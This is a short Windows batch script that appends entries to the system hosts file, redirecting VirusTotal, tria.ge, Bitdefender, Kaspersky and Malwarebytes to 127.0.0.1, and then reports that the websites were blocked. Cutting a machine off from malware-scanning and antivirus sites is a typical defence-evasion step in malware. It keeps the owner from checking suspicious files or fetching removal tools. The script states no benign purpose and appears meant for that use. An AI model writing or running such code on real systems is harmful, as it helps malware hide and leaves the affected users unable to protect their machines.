@echo off
setlocal
set "websites= virustotal.com tria.ge bitdefender.com kaspersky.com malwarebytes.com"
set "redirect_ip=127.0.0.1"
for %%i in (%websites%) do (
    echo %redirect_ip% %%i >> %SystemRoot%\System32\drivers\etc\hosts
)
echo Websites blocked successfully.
endlocal
